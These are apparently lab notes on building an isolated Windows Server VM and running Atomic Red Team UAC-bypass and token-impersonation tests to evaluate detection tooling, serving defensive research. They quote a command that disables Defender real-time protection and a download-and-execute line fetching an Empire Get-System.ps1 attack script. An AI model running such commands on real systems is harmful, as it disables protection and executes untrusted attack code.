# VM2 setup notes

Facts recorded while building VM2 ([VM2-RUNBOOK.md](VM2-RUNBOOK.md)), for Amendment 2 of
[docs/design/package-v3-and-vm2.md](../../docs/design/package-v3-and-vm2.md). Times are
India Standard Time (UTC+5:30) unless marked Z.

## Machine

- VirtualBox 7.2.12 on the host; VM `CPES-WinServer2022-VM2`: 8 GB RAM, 4 vCPUs, EFI,
  80 GB VDI, NIC1 host-only (`192.168.56.102`), NIC2 NAT (setup only), clipboard and
  drag-and-drop disabled, read-only shared folder `vm2setup` (setup only).
- Mouse PS/2, USB off. With the USB tablet (xHCI) on, the VM hung in the firmware on every
  guest-initiated restart (2026-10-28); switched back before the first boot of the installed OS.
- ISO `SERVER_EVAL_x64FRE_en-us.iso`, 5,044,094,976 bytes,
  SHA-256 `3E4FA6D8507B554856FC9CA6079CC402DF11A8B79344871669F0251535255325`.
- Windows Server 2022 Standard Evaluation (Desktop Experience), build 20348 before updates.
  Computer name `CPES-VM2`; time zone India Standard Time.
- Guest Additions 7.2.12 (silent install).
- Session user `cpeslab`, a member of Administrators (not the built-in Administrator).
- Audit policy: *Security System Extension* = Success (Security 4697).

## Software

| Component | VM2 | vm-live-v1 |
|---|---|---|
| Sysmon | **15.22** | 15.21 |
| Sysmon config | `sysmon-config-v2.xml`, SHA-256 `B58F8F5B…2373E2C8` | same file, same hash |
| Elasticsearch | 9.4.3 (SHA-512 verified), Windows service, 2 GB heap | 9.4.3 |
| Winlogbeat | 9.4.3 (SHA-512 verified), index `cpes-live-vm2`; password in the Winlogbeat keystore | 9.4.3, index `cpes-live-v1`; password in `winlogbeat.yml` |
| Atomic Red Team | installed 2026-10-28 (master); prerequisites met for all ten tests | atomics dated 2026-08-25 |
| Defender exclusion | `C:\AtomicRedTeam` | `C:\AtomicRedTeam` |

## Events

- 2026-10-28 ~22:36: the VirtualBox window on the host closed (the host user clicked
  "Switch user"), powering VM2 off during Windows Update. It rebooted cleanly; Windows Update
  resumed. VM2 now runs as a separate VirtualBox process (`startvm --type separate`).
- 2026-10-29 ~02:00: Winlogbeat's install script moved its data folder to
  `C:\Program Files\Winlogbeat-Data`; the service reads the keystore from
  `C:\Elastic\winlogbeat-9.4.3-windows-x86_64\data\`, so the keystore was copied there.

## Preflight, 2026-10-29 02:04 (before Phase C)

All checks OK (cpeslab not built-in, UAC on, Sysmon/Winlogbeat running, config hash, pipe events,
audit 4697, Elasticsearch on 9200 with 2 GB heap, Atomic module and prerequisites for all ten
tests), except:

- **`sdclt.exe` is absent** (`C:\Windows\System32\sdclt.exe`): Windows Server 2022 has no
  Backup and Restore control panel. T1548.002 #7 (sdclt DelegateExecute) cannot elevate here.
- No internet route: expected, the NAT adapter is still on for setup.
- Defender: real-time protection and behaviour monitoring on (turned off only before the attacks).
- From the host, port 9200 on `192.168.56.102` is unreachable while Proton VPN is connected on
  the host; inside the VM Elasticsearch listens on all addresses and the firewall rule allows 9200.

## Freeze, 2026-10-29 (Phase C)

- Windows Update: up to date at build **20348.5622** (KB5122881, KB5122882, KB5127687).
- NAT adapter removed, shared folder `vm2setup` removed, Guest Additions CD ejected;
  clipboard and drag-and-drop disabled. Only the host-only adapter remains.
- Final preflight (02:38): 26 checks OK, including "no internet route"; the only failure is
  `sdclt.exe` absent (Amendment 2).
- Host health check (`lab/check_lab.py`, index `cpes-live-vm2`, Proton VPN disconnected on the
  host for the check): all OK, "Lab is ready for live CPES".
- Snapshot **`vm2-ready`** taken with the VM powered off (UUID `01f3fe1f-19a9-4f1d-b1ee-a59da5e6cb80`).
  Defender real-time protection is on in the snapshot.

## Session, 2026-10-29 (Phase D)

Operational events, recorded as they happened. None changes the pre-registered procedure.

- 03:21 VM2 started from `vm2-ready`; `cpeslab` signed in at the console.
- **Benign period** 03:24:03–03:54:32 (`benign-period.csv`). The script's service lifecycle and Defender
  quick scan ran; the ordinary use was driven from the host with VirtualBox keyboard input: File Explorer
  (twice), Notepad, Settings, Task Manager, and two "Run as administrator" PowerShell windows approved at
  the UAC prompt and closed. No Atomic test ran.
- 03:56–04:01 Defender real-time protection turned off (`Set-MpPreference -DisableRealtimeMonitoring 1`);
  state exported to `defender-state-before-attacks.csv` (RealTimeProtectionEnabled and
  BehaviorMonitorEnabled False, AntivirusEnabled True, IsTamperProtected False). Typed input from the host
  dropped or shifted characters on long lines; commands were retyped slowly and checked on screen before
  Enter. One stray empty file (`C:\CPES-session\de`) from a truncated line was deleted.
- 04:02:25 **Part 1 (uac)** started in a non-administrator PowerShell window. The Event Viewer, Fodhelper and
  ComputerDefaults runs each opened an elevated `cmd.exe` without a UAC prompt.
- During part 1, on the host only: `service-install-only` became a named engine mode (`evaluation/engine.py`),
  identical to the definition `evaluation/package_v3.py` already registered; the dashboard gained a mode
  selector. No detector or protocol definition changed.
- 05:02:33 Part 1 finished: 20 runs logged. Every Event Viewer, Fodhelper and ComputerDefaults run left an elevated
  `cmd.exe` window open; they were closed between the parts (`Get-Process cmd | Stop-Process`, ~05:04, more than
  150 s after the last part-1 run and before the first part-2 run).
- 05:05:13 **Part 2 (admin)** started in an administrator PowerShell window.
- ~05:16 **Finding:** T1134.001 #1 (Named pipe client impersonation) fetches its attack script at run time
  (`IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/…/Get-System.ps1')`). With the VM isolated
  (no NAT, as pre-registered) the download fails ("The remote name could not be resolved"), `Get-System` is
  never defined, and the test exits 0 without attempting impersonation. `Invoke-AtomicTest -CheckPrereqs`
  reports "No Preqs Defined" for this test, so the preflight could not catch it. The procedure is not changed
  mid-session; these runs stay in the denominators and count as escalation not completed. vm-live-v1 was also
  isolated, which very likely explains why its 15 token runs never reached SYSTEM.
